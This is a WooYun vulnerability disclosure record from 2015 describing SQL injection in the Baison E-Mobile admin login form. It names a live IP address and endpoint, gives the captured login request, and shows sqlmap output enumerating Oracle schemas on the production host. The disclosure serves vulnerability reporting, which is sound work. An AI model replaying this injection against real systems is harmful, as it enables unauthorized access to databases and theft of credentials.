{"id": 72539, "wybug_id": "wooyun-2015-0145759", "wybug_title": "Baison/百胜生产系统后台管理登陆框SQL注入", "wybug_corp": "baison.com.cn", "wybug_author": "飞鸟", "wybug_date": "2015-10-10 19:55", "wybug_open_date": "2016-01-13 19:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-15：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向公众公开  简要描述： Baison/百胜E-Mobile信息系统后台管理登陆框注入，可以利用注入获取系统中的敏感数据 详细说明：  http://218.93.120.202:89/manager/login.do输入用户名、密码和验证码登陆，抓取数据包： \nGET /manager/verifyLogin.do?loginid=admin&password=admin&authcode=dqar HTTP/1.1Host: 218.93.120.202:89User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Referer: http://218.93.120.202:89/manager/login.doCookie: JSESSIONID=abcCvmc3fc7A95-pLspbvConnection: keep-alive\n，利用SQLMap进行弱口令利用\n\n\n\n\nSMAN[11:07:37] [INFO] retrieved: SYSTEM[11:11:17] [INFO] retrieved: TSMSYS[11:15:08] [INFO] retrieved: WMS[11:17:44] [ERROR] invalid character detected. retrying..[11:17:44] [WARNING] increasing time delay to 6 secondsYS[11:19:13] [INFO] retrieved: X[11:20:52] [ERROR] invalid character detected. retrying..[11:20:52] [WARNING] increasing time delay to 7 secondsDBavailable databases [16]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] ECOLOGY[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB[11:22:19] [INFO] fetched data logged to text files under 'C:\\Users\\*****\\.sqlmap\\output\\218.93.120.202'\n\nCOLOGY[11:30:31] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to databacurrent schema (equivalent to database on Oracle):    'ECOLOGY'[11:30:31] [INFO] fetched data logged to text files under 'C:\\Users\\*****\\.sqlmap\\output\\218.93.120.202'\n\n\n\n\n可以获取用户名和密码列表，由于是生产系统不做过多测试   漏洞证明：  http://218.93.120.202:89/manager/login.do输入用户名、密码和验证码登陆，抓取数据包：GET /manager/verifyLogin.do?loginid=admin&password=admin&authcode=YEDO HTTP/1.1Host: 218.93.120.202:89User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Referer: http://218.93.120.202:89/manager/login.do?message=103&verify=Cookie: JSESSIONID=abcCvmc3fc7A95-pLspbvConnection: keep-alive，利用SQLMap进行弱口令利用\n\n\n\n\nSMAN[11:07:37] [INFO] retrieved: SYSTEM[11:11:17] [INFO] retrieved: TSMSYS[11:15:08] [INFO] retrieved: WMS[11:17:44] [ERROR] invalid character detected. retrying..[11:17:44] [WARNING] increasing time delay to 6 secondsYS[11:19:13] [INFO] retrieved: X[11:20:52] [ERROR] invalid character detected. retrying..[11:20:52] [WARNING] increasing time delay to 7 secondsDBavailable databases [16]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] ECOLOGY[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB[11:22:19] [INFO] fetched data logged to text files under 'C:\\Users\\*****\\.sqlmap\\output\\218.93.120.202'\n\nCOLOGY[11:30:31] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to databacurrent schema (equivalent to database on Oracle):    'ECOLOGY'[11:30:31] [INFO] fetched data logged to text files under 'C:\\Users\\*****\\.sqlmap\\output\\218.93.120.202'\n\n\n\n\n可以获取用户名和密码列表，由于是生产系统不做过多测试   修复方案：  过滤   版权声明：转载请注明来源 飞鸟@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-01-13 19:56 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}